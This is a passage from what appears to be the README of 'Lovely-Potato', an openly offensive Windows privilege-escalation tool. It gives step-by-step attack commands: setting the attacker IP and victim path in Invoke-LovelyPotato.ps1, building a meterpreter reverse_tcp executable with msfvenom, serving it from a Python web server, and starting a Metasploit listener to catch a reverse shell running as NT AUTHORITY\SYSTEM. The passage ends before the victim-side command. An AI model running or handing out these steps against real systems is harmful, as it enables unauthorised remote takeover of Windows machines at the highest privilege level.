Then modify the two following variables in 'Invoke-LovelyPotato.ps1' as below (attacker machine IP, writable path on the victim machine):

$RemoteDir = "http://[AttackerIP]
$LocalPath = "[WritablePathOnVictimMachine]"
Now create a meterpreter binary on the attacker machine or use any other executable reverse shell:

root@attacker:~/Lovely-Potato# msfvenom -p windows/meterpreter/reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f exe -o meterpreter.exe
Start a web server in this repo to serve your meterpreter.exe and other dependencies:

root@attacker:~/Lovely-Potato# python3 -m http.server 80
On a new terminal, launch metasploit console (or any listener which handles whatever you are serving as a reverse shell):

root@attacker:~# msfdb run
msf5 > # I'm going to omit setting up the multi handler as it is something you should already know
Finally enter below command on victim's powershell console and you MUST WAIT 10 minutes for reverse shell running as user NT AUTHORITY\SYSTEM!
